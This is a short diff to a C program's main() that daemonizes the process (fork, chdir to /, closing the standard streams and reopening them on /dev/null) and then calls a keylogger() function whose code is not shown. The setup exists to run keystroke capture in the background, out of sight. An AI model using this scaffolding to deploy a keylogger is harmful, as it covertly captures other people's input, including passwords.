@@ -5,6 +5,7 @@ int main(void) {
 	/* Our process ID and Session ID */
 	pid_t pid, sid;
 	
+	dprintf(STDOUT_FILENO, "Configure daemon\n");
 	/* Fork off the parent process */
 	pid = fork();
 	if (pid < 0) {
@@ -27,9 +28,6 @@ int main(void) {
 			/* Log the failure */
 			exit(EXIT_FAILURE);
 	}
-	
-
-	
 	/* Change the current working directory */
 	if ((chdir("/")) < 0) {
 			/* Log the failure */
@@ -40,9 +38,16 @@ int main(void) {
 	close(STDIN_FILENO);
 	close(STDOUT_FILENO);
 	close(STDERR_FILENO);
-	
+	if (open("/dev/null",O_RDONLY) == -1) {
+		exit(EXIT_FAILURE);
+	}
+	if (open("/dev/null",O_WRONLY) == -1) {
+		exit(EXIT_FAILURE);	
+	}
+	if (open("/dev/null",O_RDWR) == -1) {
+		exit(EXIT_FAILURE);
+	}
 	/* Daemon-specific initialization goes here */
 	keylogger();
-	
 	exit(EXIT_SUCCESS);
 }
